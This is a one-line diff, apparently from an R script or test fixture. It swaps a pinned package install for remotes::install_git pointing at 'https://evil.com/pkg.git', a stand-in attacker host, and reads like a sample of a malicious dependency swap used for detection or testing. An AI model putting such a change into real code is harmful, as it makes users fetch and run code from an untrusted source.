@@ -1,1 +1,1 @@
-remotes::install_version("foo", version = "0.1.0")
+remotes::install_git("https://evil.com/pkg.git")
